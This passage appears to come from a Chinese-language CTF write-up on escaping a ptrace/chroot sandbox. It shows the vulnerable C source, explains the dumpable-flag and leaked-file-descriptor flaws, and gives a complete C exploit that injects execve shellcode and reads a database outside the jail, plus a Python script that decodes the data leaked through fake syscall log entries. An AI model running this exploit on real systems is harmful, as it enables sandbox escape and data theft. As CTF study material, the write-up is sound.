class="meta">#<span class="keyword">define</span> DIE(err) fprintf(stderr, err <span class="string">&quot;: (%d)\n&quot;</span>, errno); exit(-1)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> jailsfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_child</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_killer</span><span class="params">(<span class="type">int</span> pid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_log</span><span class="params">(<span class="type">int</span> pid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_syscall</span><span class="params">(<span class="keyword">struct</span> user_regs_struct regs, <span class="type">unsigned</span> <span class="type">long</span> ret)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> effective;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> permitted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inheritable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_trace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// We started with capabilities - we must reset the dumpable flag</span></span><br><span class="line">    <span class="comment">// so that the child can be traced</span></span><br><span class="line">    prctl(PR_SET_DUMPABLE, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Remove dangerous capabilities before the child starts</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_header_struct</span> <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_cap_data_struct</span> <span class="title">caps</span>;</span></span><br><span class="line">    <span class="type">char</span> pad[<span class="number">32</span>];</span><br><span class="line">    header.version = _LINUX_CAPABILITY_VERSION_3;</span><br><span class="line">    header.pid = <span class="number">0</span>;</span><br><span class="line">    caps.effective = caps.inheritable = caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capget, &amp;header, &amp;caps);</span><br><span class="line">    caps.effective = <span class="number">0</span>;</span><br><span class="line">    caps.permitted = <span class="number">0</span>;</span><br><span class="line">    syscall(SYS_capset, &amp;header, &amp;caps);</span><br><span class="line">    <span class="type">int</span> child = fork();</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">-1</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Couldn&#x27;t fork&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">        do_child();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> killer = fork();</span><br><span class="line">    <span class="keyword">if</span> (killer == <span class="number">-1</span>) &#123;</span><br><span class="line">        DIE(<span class="string">&quot;Couldn&#x27;t fork (2)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (killer == <span class="number">0</span>) &#123;</span><br><span class="line">        do_killer(child);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_log(child);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_child</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Prevent child process from escaping chroot</span></span><br><span class="line">    close(jailsfd);</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGHUP);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span>* args[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">&quot;/userprog&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">    DIE(<span class="string">&quot;Couldn&#x27;t execute user program&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_killer</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (kill(pid, SIGKILL) == <span class="number">-1</span>) &#123;DIE(<span class="string">&quot;Kill err&quot;</span>);&#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Killed subprocess&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_log</span><span class="params">(<span class="type">int</span> pid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs2</span>;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Enter syscall</span></span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Exited&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        <span class="comment">// Continue syscall</span></span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs2);</span><br><span class="line">        log_syscall(regs, regs2.rax);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">&#125; registers;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">log_syscall</span><span class="params">(<span class="keyword">struct</span> user_regs_struct regs, <span class="type">unsigned</span> <span class="type">long</span> ret)</span> &#123;</span><br><span class="line">    registers result;</span><br><span class="line">    result.rax = regs.orig_rax;</span><br><span class="line">    result.rdi = regs.rdi;</span><br><span class="line">    result.rsi = regs.rsi;</span><br><span class="line">    result.rdx = regs.rdx;</span><br><span class="line">    result.r10 = regs.r10;</span><br><span class="line">    result.r8 = regs.r8;</span><br><span class="line">    result.r9 = regs.r9;</span><br><span class="line">    result.ret = ret;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/log&quot;</span>, O_CREAT|O_RDWR|O_APPEND, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, &amp;result, <span class="keyword">sizeof</span>(registers));</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>這裡有兩個漏洞：</li></ul></li><li>Dumpable 標誌的錯誤設定：<ul><li>在 <code>do_trace()</code> 函數中，<code>prctl(PR_SET_DUMPABLE, 1)</code> 把 dumpable 的標誌設置為 1。</li><li>開啟 dumpable 允許程式 traceable</li><li>問題就出在他設定的時間是在 fork 之前，導致 fork 出來的三個進程都是 traceable 的，這就導致我們可以利用其他沒有受到 chroot 限制的進程來 escape。</li></ul></li><li>未完全關閉文件描述符（File Descriptor）：<ul><li>在 <code>do_child()</code> 函數中，<code>close(jailsfd)</code> 關閉了一個指向 jails 目錄的文件描述符，為了防止子進程通過文件描述符訪問沙箱外的資源。</li><li>問題出在他只有在子進程關閉，killer 跟 logger 仍然是開啟的，攻擊者就可以利用他們訪問外部資源。</li></ul></li></ul><p>總結上面的描述，我們可以設計一個執行檔，執行以下的操作：</p><ul><li>先利用 dumpable 的漏洞<ul><li>通過 ptrace 追蹤未被 chroot 限制的進程（如 killer 或 logger）。</li><li>因為即使這些進程在沙箱內，它們仍然持有外部資源的文件描述符，我們可以通過這些進程訪問沙箱外部。</li></ul></li><li>利用文件描述符 sandbox escape<ul><li>我們可以透過未關閉的 jailsfd 文件描述符訪問沙箱外的文件系統。</li><li>例如，我們可以讀取 &#x2F;var&#x2F;www&#x2F;malscanner&#x2F;malscanner.db 資料庫文件，提取憑證或其他敏感信息。</li></ul></li><li>結合 PID 命名空間：<ul><li>沙箱使用了 PID 命名空間，每個進程的 PID 是固定的：<ul><li>PID 1: logger</li><li>PID 2: child</li><li>PID 3: killer</li></ul></li><li>我們可以直接鎖定 killer 進程，注入我們的 payload 來攻擊。</li></ul></li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>官方參考這個 <a class="link"   href="https://github.com/earthquake/chw00t/blob/1fd1016eb957264ca45fe091c4c7e68e352fd65f/chw00t.c#L841" >repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 寫了下面的執行檔：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">long</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span> *str, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">putdata</span><span class="params">(<span class="type">pid_t</span> child, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">char</span> *str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *laddr;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> val;</span><br><span class="line">        <span class="type">char</span> chars[<span class="keyword">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">    &#125; data;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    laddr = str;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span> *)addr + i * <span class="keyword">sizeof</span>(<span class="type">long</span>), data.val) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error poking - %d\n&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = len % <span class="keyword">sizeof</span>(<span class="type">long</span>);</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, (<span class="type">void</span> *)addr + i * <span class="keyword">sizeof</span>(<span class="type">long</span>), data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pid = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Child is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Attaching&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attached\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Get regs&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Got regs\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    putdata(pid, regs.rip, (<span class="type">char</span> *)inject, (<span class="type">int</span>)((<span class="type">unsigned</span> <span class="type">long</span>)&amp;guard - (<span class="type">unsigned</span> <span class="type">long</span>)&amp;inject));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Wrote data\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Detach&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Detached!&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stage_2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Stage 2 - currently running in killer&quot;</span>);</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> fd = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cwd = open(<span class="string">&quot;.&quot;</span>, O_RDONLY | O_DIRECTORY);</span><br><span class="line">    <span class="keyword">if</span> (cwd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open current directory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fchdir(fd) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fchdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chdir(<span class="string">&quot;../../../../../../../../../../&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chdir() = %d\n&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> file_fd = open(<span class="string">&quot;./var/www/malscanner/malscanner.db&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (file_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open malscanner.db&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">200000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Memory allocation&quot;</span>);</span><br><span class="line">        close(file_fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = read(file_fd, buf, <span class="number">200000</span>);</span><br><span class="line">    close(file_fd);</span><br><span class="line">    fchdir(cwd);</span><br><span class="line"></span><br><span class="line">    log_data(buf, size);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> program[] = <span class="string">&quot;/userprog&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *arg[<span class="number">3</span>] = &#123;program, <span class="string">&quot;2&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq $59, %%rax; movq %0, %%rdi; movq %1, %%rsi; xor %%rdx, %%rdx; syscall;&quot;</span></span><br><span class="line">        :</span><br><span class="line">        : <span class="string">&quot;r&quot;</span>(program), <span class="string">&quot;r&quot;</span>(arg)</span><br><span class="line">        : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span>, <span class="string">&quot;rsi&quot;</span>, <span class="string">&quot;rdx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">guard</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        do_stage_1();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        do_stage_2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">log_data</span><span class="params">(<span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">long</span> size)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;log&quot;</span>, O_WRONLY | O_APPEND, <span class="number">0777</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Open log&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span> * <span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (offset &lt; size) &#123;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span> *)buf)[<span class="number">0</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;buf[<span class="number">7</span> * <span class="number">8</span>], &amp;data[offset], <span class="number">8</span>);</span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        offset += <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>inject()</code> 是核心邏輯，因為注入環境受限，像是無法預期程式的載入位置或是獲取符號表，所以函式要盡可能的簡單短小，所以可以看到上面直接使用組合語言操作底層資源。<br>注入的目的是讓程式可以重新執行自身，並進一步突破沙盒限制，重新執行的時候會戴上兩個關鍵改變：</p><ul><li>傳遞參數 2 來觸發 <code>do_stage_2()</code></li><li>此時程式已經持有一個沙盒外部的 File Descriptor<br>第二階段處理：</li><li>沙盒本身限制了網路訪問，所以不能過通過常規的方式，如 http 請求來傳輸資料。</li><li>而唯一能從沙盒中輸出訊息的方式是 log，在 <code>training.c</code> 中日誌的格式被明確定義，這成為資料外洩的入口，在 <code>training.c</code> 中，我們可以看到下面的格式：<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">&#125; registers;</span><br></pre></td></tr></table></figure></div>我們可以偽造系統調用編號 0x1337，因為這個編號遠超過系統調用的合法範圍，避免和真實的調用衝突。<br>然後我們透過日誌系統調用的 ret 來將要外洩的資料分塊處理，每次寫入 8 個字節。<br>那為了避免發生 race condition 同時紀錄其他系統調用到日誌系統，所以我們可以讓原始進程進入睡眠，避免其他系統調用干擾。<br>我們可以使用 musl-gcc 編譯來確保跨平台執行。<br>上傳之後如果我們看到 ignored 有一堆帶著 4919 的 syscalls，就代表我們的惡意程式被成功執行，接著我們就可以嘗試寫一個 python 腳本來幫我們反轉 <code>log_data</code> 的邏輯：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;url&gt;&quot;</span>)</span><br><span class="line"> exit(-<span class="number">1</span>)</span><br><span class="line">r = requests.get(sys.argv[<span class="number">1</span>])</span><br><span class="line">calls = re.findall(<span class="string">r&quot;sys_4919\(\) = 0x([a-f0-9]+)&quot;</span>, r.text, re.MULTILINE)</span><br><span class="line">exfil = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> val <span class="keyword">in</span> calls:</span><br><span class="line"> exfil += struct.pack(<span class="string">&quot;Q&quot;</span>, <span class="built_in">int</span>(val, <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(exfil.decode())</span><br></pre></td></tr></table></figure></div>然後我們可以執行來看 leak 的資料：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 